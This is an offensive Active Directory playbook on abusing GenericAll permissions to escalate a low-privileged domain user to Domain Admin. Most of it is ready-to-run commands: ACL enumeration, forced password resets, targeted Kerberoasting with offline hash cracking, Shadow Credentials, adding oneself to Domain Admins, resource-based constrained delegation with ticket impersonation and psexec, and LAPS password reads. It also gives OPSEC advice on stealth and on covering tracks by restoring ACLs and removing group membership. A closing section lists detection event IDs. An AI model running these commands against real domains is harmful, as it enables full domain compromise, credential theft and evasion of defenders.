---
title: "Attack #19 — GenericAll Abuse"
description: "GenericAll is the most dangerous misconfigured ACL permission in Active Directory. It grants a principal (user, group, or computer) full control over a…"
category: active-directory
tags: ["active-directory", "kerberos", "adcs", "delegation", "privilege-escalation"]
tools: ["NetExec", "Impacket", "Rubeus", "Certipy", "BloodHound"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Three/🟡 Attack #19 — GenericAll Abuse.md"
---
# 🟡 Attack #19 — GenericAll Abuse

***

## 📖 How It Works

GenericAll is the **most dangerous misconfigured ACL permission in Active Directory**. It grants a principal (user, group, or computer) **full control** over a target AD object — equivalent to owning it entirely. When a low-privileged user has GenericAll over a high-value target (Domain Admin account, privileged group, computer object, GPO, or OU), they can escalate to full domain compromise in a single move.

The attack exploits the **Discretionary Access Control List (DACL)** that governs permissions on every AD object. DACLs contain Access Control Entries (ACEs) that define which principals can perform which operations on the object. A GenericAll ACE grants the equivalent of all individual permissions combined: read, write, delete, modify owner, modify DACL, reset password, write to any attribute, and add/remove group members. These misconfigurations are **extremely common** in enterprise environments — often introduced by helpdesk delegation, migration tools, Exchange setup, or administrators who didn't understand the permission model.

### What GenericAll Lets You Do (By Target Type)

| Target Object Type | What You Can Do | Impact |
|---|---|---|
| **User** | Reset their password, set SPN (Kerberoast), write to msDS-KeyCredentialLink (Shadow Credentials) | Full account takeover — if target is DA, you own the domain |
| **Group** | Add yourself (or any user) as a member | Instant privilege escalation — add yourself to Domain Admins |
| **Computer** | Write msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD), read LAPS password | Machine compromise, RBCD → impersonate any user to that host |
| **GPO** | Modify Group Policy — add scheduled tasks, startup scripts, user rights | Push malicious config to all machines linked to that GPO |
| **OU** | Modify inheritance, add malicious GPO links | Control all objects in the OU |
| **Domain Object** | Write to any domain-level attribute — DCSync ACE, modify trusts | Total domain compromise |

### The Full Attack Flow

```
1. Gain initial foothold (any domain user account)
2. Run BloodHound or PowerView to enumerate ACLs
3. Identify GenericAll edges from your controlled principal to high-value targets
4. Exploit based on target object type:
   - User → reset password or set Shadow Credentials
   - Group → add yourself as a member
   - Computer → configure RBCD or read LAPS
5. Escalate to Domain Admin
6. Optionally restore original ACL state to cover tracks
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Domain user account** | Any authenticated domain user — GenericAll is the permission YOU already have |
| **GenericAll ACE on target** | Must exist in the target object's DACL — use BloodHound or PowerView to find it |
| **Network access to DC** | LDAP (389/636) access for ACL queries and modifications |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **BloodHound + SharpHound** | Windows/Linux | Visual attack path mapping — identifies GenericAll edges automatically |
| **PowerView** | Windows | `Get-ObjectAcl`, `Add-DomainGroupMember`, `Set-DomainUserPassword` |
| **Impacket — dacledit.py** | Linux | Edit DACLs remotely — add/remove ACEs from Linux |
| **Impacket — owneredit.py** | Linux | Change object ownership |
| **Impacket — addcomputer.py** | Linux | Create machine accounts (for RBCD exploitation) |
| **bloodyAD** | Linux | All-in-one AD exploitation — ACL abuse, password reset, group membership |
| **ldap_shell** | Linux | Interactive LDAP shell — for quick ACL exploitation |
| **Certipy** | Linux | Shadow Credentials exploitation when GenericAll on user/computer |

***

## 💻 Full Commands

### 🔵 Step 1 — Enumerate GenericAll Permissions

#### BloodHound (Recommended — Visual Attack Paths)

```powershell
# ── Collect data with SharpHound ──────────────────────────────────────────────
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip
# Or
.\SharpHound.exe -c All,GPOLocalGroup --zipfilename bloodhound_data.zip

# ── Upload to BloodHound and run queries:
# Pre-built query: "Find Shortest Paths to Domain Admins"
# Pre-built query: "Find Principals with DCSync Rights"
# Custom Cypher: Find all GenericAll edges from your user
# MATCH p=(n {name:'LOW_USER@CORP.LOCAL'})-[r:GenericAll]->(m) RETURN p
```

```bash
# ── Linux — BloodHound.py (remote collection without touching the target) ────
bloodhound-python -u low_user -p 'Password1' -d corp.local -ns 10.10.10.10 \
  -c All --zip
# Upload the resulting .zip to BloodHound GUI
```

#### PowerView (Detailed ACL Enumeration)

```powershell
# ── Find objects where your user has GenericAll ───────────────────────────────
Import-Module .\PowerView.ps1

# Get ACLs where current user has GenericAll on any object
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs | 
  Where-Object { $_.ActiveDirectoryRights -match "GenericAll" } |
  Select-Object SecurityIdentifier, ActiveDirectoryRights, ObjectDN

# Resolve SIDs to names
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs | 
  Where-Object { $_.ActiveDirectoryRights -match "GenericAll" } |
  ForEach-Object { 
    $_ | Add-Member -NotePropertyName "Principal" -NotePropertyValue (
      Convert-SidToName $_.SecurityIdentifier
    ) -PassThru
  } | Select-Object Principal, ActiveDirectoryRights, ObjectDN

# ── Enumerate all ACL attack paths from a specific user ──────────────────────
Find-InterestingDomainAcl -ResolveGUIDs | 
  Where-Object { $_.IdentityReferenceName -match "low_user" }

# ── Check specific object for dangerous ACEs ─────────────────────────────────
Get-ObjectAcl -SamAccountName "Administrator" -ResolveGUIDs | 
  Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite" }
```

***

### 🔴 Exploitation — GenericAll on a USER

```powershell
# ══════════════════════════════════════════════════════════════════════════════
# METHOD 1: Force Password Reset (loudest — generates 4724 event)
# ══════════════════════════════════════════════════════════════════════════════

# ── PowerView — reset the target user's password ──────────────────────────────
$NewPassword = ConvertTo-SecureString 'P@ssword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetadmin -AccountPassword $NewPassword -Verbose

# ── Native PowerShell (AD module) ─────────────────────────────────────────────
Set-ADAccountPassword -Identity targetadmin -NewPassword (
  ConvertTo-SecureString 'P@ssword123!' -AsPlainText -Force
) -Reset

# ── net user ──────────────────────────────────────────────────────────────────
net user targetadmin P@ssword123! /domain

# ══════════════════════════════════════════════════════════════════════════════
# METHOD 2: Targeted Kerberoasting (stealthier — set SPN, roast, remove SPN)
# ══════════════════════════════════════════════════════════════════════════════

# Step 1: Set an SPN on the target user (requires GenericAll/GenericWrite)
Set-DomainObject -Identity targetadmin -Set @{serviceprincipalname='nonexist/YOURSPN'}

# Step 2: Request TGS for the newly-set SPN (Kerberoast)
.\Rubeus.exe kerberoast /user:targetadmin /outfile:targeted_roast.txt

# Step 3: Crack the hash offline
hashcat -m 13100 targeted_roast.txt rockyou.txt --force

# Step 4: Remove the SPN (cover tracks)
Set-DomainObject -Identity targetadmin -Clear serviceprincipalname

# ══════════════════════════════════════════════════════════════════════════════
# METHOD 3: Shadow Credentials (stealthiest — write msDS-KeyCredentialLink)
# ══════════════════════════════════════════════════════════════════════════════

# Windows — Whisker
.\Whisker.exe add /target:targetadmin /domain:corp.local
# Whisker outputs a Rubeus command to request a TGT with the new credential
# Run the outputted command to get a TGT as targetadmin

# Linux — pywhisker
python3 pywhisker.py -d corp.local -u low_user -p 'Password1' \
  --target targetadmin --action add --dc-ip 10.10.10.10
# Then use the generated PFX certificate to authenticate:
# certipy auth -pfx <generated>.pfx -dc-ip 10.10.10.10
```

```bash
# ── Linux — Reset password via Impacket / bloodyAD ────────────────────────────

# bloodyAD (simplest)
bloodyAD -d corp.local -u low_user -p 'Password1' --host DC01.corp.local \
  set password targetadmin 'P@ssword123!'

# Impacket — using rpcclient-style approach
net rpc password targetadmin 'P@ssword123!' -U 'corp.local/low_user%Password1' \
  -S DC01.corp.local

# Impacket — ldap_shell for interactive exploitation
python3 ldap_shell.py corp.local/low_user:'Password1'@DC01.corp.local
# > set_password targetadmin P@ssword123!

# Shadow Credentials from Linux
certipy shadow auto -u low_user@corp.local -p 'Password1' \
  -account targetadmin -dc-ip 10.10.10.10
```

***

### 🔴 Exploitation — GenericAll on a GROUP

```powershell
# ── Add yourself to Domain Admins ─────────────────────────────────────────────
# PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members "low_user" -Verbose

# Native PowerShell
Add-ADGroupMember -Identity "Domain Admins" -Members "low_user"

# net group
net group "Domain Admins" low_user /add /domain

# ── Verify ────────────────────────────────────────────────────────────────────
Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name
net group "Domain Admins" /domain
```

```bash
# ── Linux — Add yourself to group ─────────────────────────────────────────────

# bloodyAD
bloodyAD -d corp.local -u low_user -p 'Password1' --host DC01.corp.local \
  add groupMember "Domain Admins" low_user

# Impacket — ldap_shell
python3 ldap_shell.py corp.local/low_user:'Password1'@DC01.corp.local
# > add_user_to_group low_user "Domain Admins"

# NetExec — verify
nxc smb DC01.corp.local -u low_user -p 'Password1' -x "whoami /groups"
```

***

### 🔴 Exploitation — GenericAll on a COMPUTER

```powershell
# ══════════════════════════════════════════════════════════════════════════════
# METHOD 1: Resource-Based Constrained Delegation (RBCD)
# ══════════════════════════════════════════════════════════════════════════════

# Step 1: Create a machine account (or use one you control)
New-MachineAccount -MachineAccount FAKEMACHINE -Password $(ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)

# Step 2: Get the SID of your machine account
$ComputerSid = Get-DomainComputer FAKEMACHINE -Properties objectsid | Select -Expand objectsid

# Step 3: Write the msDS-AllowedToActOnBehalfOfOtherIdentity attribute
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity TARGET_COMPUTER$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Step 4: S4U2Self + S4U2Proxy to impersonate DA to target
.\Rubeus.exe s4u /user:FAKEMACHINE$ /rc4:<FAKEMACHINE_HASH> \
  /impersonateuser:Administrator \
  /msdsspn:CIFS/TARGET_COMPUTER.corp.local /ptt

# ══════════════════════════════════════════════════════════════════════════════
# METHOD 2: Read LAPS Password (if LAPS is deployed)
# ══════════════════════════════════════════════════════════════════════════════
Get-DomainComputer TARGET_COMPUTER -Properties ms-Mcs-AdmPwd
# Output: ms-Mcs-AdmPwd = <cleartext local admin password>
```

```bash
# ── Linux — RBCD exploitation ─────────────────────────────────────────────────

# Step 1: Create machine account
addcomputer.py -computer-name 'FAKEMACHINE$' -computer-pass 'FakePass123!' \
  -dc-ip 10.10.10.10 corp.local/low_user:'Password1'

# Step 2: Configure RBCD
rbcd.py -delegate-from 'FAKEMACHINE$' -delegate-to 'TARGET_COMPUTER$' \
  -action write -dc-ip 10.10.10.10 corp.local/low_user:'Password1'

# Step 3: Get impersonated ticket via S4U
getST.py -spn cifs/TARGET_COMPUTER.corp.local -impersonate Administrator \
  -dc-ip 10.10.10.10 corp.local/'FAKEMACHINE$':'FakePass123!'

# Step 4: Use the ticket
export KRB5CCNAME=Administrator@cifs_TARGET_COMPUTER.corp.local@CORP.LOCAL.ccache
psexec.py -k -no-pass corp.local/Administrator@TARGET_COMPUTER.corp.local
```

***

## 🎯 OPSEC Tips

- **Prefer Shadow Credentials over password reset** — Shadow Credentials (writing msDS-KeyCredentialLink) are stealthier because the original user's password remains unchanged and they can still log in normally; password resets immediately alert the target user and generate Event 4724
- **Targeted Kerberoasting is the middle ground** — setting a temporary SPN, roasting, and removing the SPN is stealthier than password reset but noisier than Shadow Credentials
- **Remove yourself from groups after** — if you add yourself to Domain Admins, extract what you need (KRBTGT hash via DCSync) and then remove yourself; the shorter the group membership window, the less likely detection
- **Check AdminCount** — users with `adminCount=1` are protected by AdminSDHolder; modifying their permissions may be reverted every 60 minutes
- **Log the original ACL state** — before modifying any ACLs for exploitation, save the original state so you can restore it to cover your tracks

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4724** | Security Log | Password reset attempt — monitor for non-helpdesk accounts resetting privileged user passwords |
| **4728** | Security Log | User added to a security-enabled global group — DA group modification |
| **4732** | Security Log | User added to a security-enabled local group |
| **4756** | Security Log | User added to a security-enabled universal group — Enterprise Admins |
| **5136** | Security Log | Directory service object modification — ACL changes, attribute writes (msDS-KeyCredentialLink, msDS-AllowedToActOnBehalfOfOtherIdentity) |
| **4662** | Security Log | Operation performed on an AD object — catches GenericAll usage |
| **4738** | Security Log | User account changed — SPN modification for targeted Kerberoasting |

**Primary detection signature:** Monitor Event ID **5136** for modifications to sensitive attributes: `msDS-KeyCredentialLink` (Shadow Credentials), `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD), and `servicePrincipalName` (targeted Kerberoasting). Combined with **4728** for unexpected Domain Admins group additions and **4724** for password resets of privileged accounts by non-privileged users. BloodHound's "Dangerous Rights" queries run defensively can identify these misconfigurations before attackers do.

***

## 🔗 Attack Chain Context

```
[GenericAll Abuse] ──→ Direct Privilege Escalation
         │
         ├──→ 👤 GenericAll on User → password reset / Shadow Creds / Kerberoast
         ├──→ 👥 GenericAll on Group → add self to Domain Admins
         ├──→ 💻 GenericAll on Computer → RBCD / LAPS password read
         ├──→ 📋 GenericAll on GPO → push malicious Group Policy
         ├──→ 🔑 After DA → DCSync (Attack #37) → Golden Ticket (Attack #11)
         ├──→ 🔗 Chain with: WriteDACL (#21), WriteOwner (#22), RBCD (#17)
         └──→ 💀 Defeated by: ACL auditing, least privilege, AdminSDHolder
```

**GenericAll is the most common ACL-based escalation path** found in real-world AD pentests. BloodHound consistently reveals GenericAll edges that organisations didn't know existed — often created years ago during migration, delegation setup, or Exchange installation. Run BloodHound defensively to find these paths before attackers do.

***

> ✅ **Attack #19 — GenericAll Abuse complete.**
